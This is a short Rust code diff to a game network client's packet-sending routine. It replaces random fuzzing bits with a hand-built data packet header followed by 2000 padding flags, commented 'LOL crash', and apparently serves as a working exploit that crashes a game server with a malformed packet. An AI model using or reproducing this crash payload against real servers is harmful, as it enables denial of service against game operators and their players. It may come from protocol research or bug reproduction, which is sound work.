@@ -87,8 +87,23 @@ impl GameConnection {
         let mut packet = BitStream::new();
         self.dnet.build_send_packet_header(&mut packet, NetPacketType::DataPacket);
 
-        for i in 0..(rand::random::<u16>() % 2000) {
-            packet.write_flag(rand::random());
+        packet.write_flag(false); // update mCurRate
+        packet.write_flag(false); // more rate control
+
+        packet.write_int(0, 32); // move packet start
+        packet.write_int(0, 5); // move packet count
+
+        packet.write_flag(false); // camera pos
+        packet.write_flag(false); // control force mismatch
+        packet.write_flag(false); // changed control scheme
+        packet.write_flag(false); // changed first person
+        packet.write_flag(false); // changed fov
+
+
+
+        // LOL crash
+        for _ in 0..2000 {
+            packet.write_flag(false);
         }
 
         self.send_raw(packet).await?;
